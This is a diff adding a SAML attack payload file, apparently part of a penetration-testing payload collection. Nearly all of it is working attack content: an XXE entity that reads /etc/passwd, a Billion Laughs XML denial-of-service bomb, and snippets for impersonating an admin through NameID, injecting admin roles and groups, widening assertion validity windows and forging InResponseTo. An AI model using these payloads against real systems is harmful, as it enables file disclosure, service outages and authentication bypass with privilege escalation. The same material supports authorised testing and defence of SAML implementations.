@@ -1,0 +1,49 @@
+# ============================================================
+# SAML Injection — XML-Based Attacks
+# ============================================================
+
+# ---- XXE in SAML ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+    <saml:NameID>&xxe;</saml:NameID>
+  </saml:Assertion>
+</samlp:Response>
+
+# ---- Billion Laughs (XML DoS) ----
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<samlp:Response>&lol4;</samlp:Response>
+
+# ---- Attribute Injection ----
+# Inject attributes into NameID or AttributeValue
+<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
+admin@target.com
+</saml:NameID>
+
+# ---- NameID Format Manipulation ----
+# Change format to persistent/transient/unspecified
+<saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">admin</saml:NameID>
+<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin</saml:NameID>
+
+# ---- Role/Group Attribute Injection ----
+<saml:Attribute Name="Role">
+  <saml:AttributeValue>admin</saml:AttributeValue>
+</saml:Attribute>
+<saml:Attribute Name="memberOf">
+  <saml:AttributeValue>CN=Administrators</saml:AttributeValue>
+</saml:Attribute>
+
+# ---- Condition Bypass ----
+# Modify NotBefore / NotOnOrAfter
+<saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
+
+# ---- InResponseTo Forgery ----
+# Some SPs don't validate InResponseTo
+<samlp:Response InResponseTo="FORGED_REQUEST_ID">
